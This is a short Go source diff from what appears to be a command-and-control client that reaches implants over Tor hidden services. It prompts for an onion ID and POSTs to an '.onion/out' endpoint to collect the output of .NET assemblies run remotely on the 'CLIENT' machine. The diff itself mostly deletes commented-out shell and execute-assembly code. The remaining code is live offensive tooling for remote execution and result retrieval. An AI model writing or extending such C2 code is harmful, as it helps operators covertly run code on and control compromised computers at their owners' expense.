@@ -21,8 +21,6 @@ func main() {
 	fmt.Print("Enter the onion ID: ")
 	scanner.Scan()
 	onionID := scanner.Text()
-	//fmt.Println("Establishing a shell...")
-	//doShell(onionID)
 
 	// TODO: Establish "HELLO" connection confirmation
 	fmt.Println("\nConnected to " + onionID + "\n")
@@ -51,14 +49,7 @@ func main() {
 				break
 			}
 		}
-
 	}
-
-	// This is the code for running execute-assembly
-	//scanner = bufio.NewScanner(os.Stdin)
-	//fmt.Println("Enter the assembly path on the CLIENT:")
-	//scanner.Scan()
-	//client_assembly_path := scanner.Text()
 
 }
 
@@ -103,15 +94,10 @@ func doExecuteAssembly(id, client_assembly_path string) {
 	defer resp.Body.Close()
 
 	//
-	// lets now get the updated results..can't hurt to try again
+	// lets now get the updated results... when we start to debug with interactive .net assembly we can keep getting updated output in a loop
 	//
-	//time.Sleep(time.Second*10)
 	url = "http://" + id + ".onion/out"
-
 	req, err = http.NewRequest("POST", url, bytes.NewBuffer(query))
-
-	//req, _ = http.NewRequest("POST", url, nil)
-
 	req.Header.Set("X-Forwarded-For", "1337")
 	resp, err = httpClient.Do(req)
 	if err != nil {
